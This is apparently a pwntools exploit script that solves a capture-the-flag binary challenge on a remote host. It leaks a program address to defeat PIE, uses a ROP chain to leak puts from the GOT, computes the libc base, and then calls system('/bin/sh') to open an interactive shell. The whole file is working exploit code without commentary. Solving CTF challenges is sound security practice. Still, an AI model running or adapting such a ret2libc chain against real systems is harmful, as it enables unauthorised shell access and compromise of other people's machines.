from pwn import context, args, gdb, remote, process, ELF, info, flat, rop, u64, ROP
import sys

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

context.log_level = 'debug'

# Set up pwntools for the correct architecture
exe = './chall'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
rop = ROP(elf)
libc = ELF('./libc.so.6')

offset = 40

# io = start()
io = remote('playground.tcp1p.team', 19001)

io.sendlineafter(b'Exit\n', b'2')
io.sendlineafter(b'mau ehe\n', b'1')
io.recvuntil(b'untukmuu, ')
leaked_addr = int(io.recvline(), 16)
info("leaked_address: %#x", leaked_addr)

elf.address = leaked_addr - elf.sym['main']
info("piebase: %#x", elf.address)

pop_rbp = elf.address + 0x0000000000001173
mov_rdi_rbp = elf.address + 0x00000000000011e7
ret = elf.address + rop.find_gadget(['ret'])[0]

payload = flat([
    b'A' * offset,
    pop_rbp, 
    elf.got['puts'],
    mov_rdi_rbp,
    b'B' * 8, 
    elf.plt['puts'],
    elf.sym['main']
])

io.sendlineafter(b'Exit\n', b'3')
io.sendlineafter(b': ', payload)
io.recvline()
io.recvline()
leak_puts = u64(io.recvline().strip().ljust(8, b"\x00"))
info(f'leaked_puts = {hex(leak_puts)}')

libc_base = leak_puts - 0x80e50 # puts_offset
system = libc_base + 0x50d70 # system offset
bin_sh = libc_base + 0x1d8678

payload = flat([
    b'A' * offset,
    pop_rbp,
    bin_sh,
    mov_rdi_rbp,
    b'B' * 8,
    ret,
    system,
])

io.sendlineafter(b'Exit\n', b'3')
io.sendlineafter(b': ', payload)
io.interactive()

io.close()
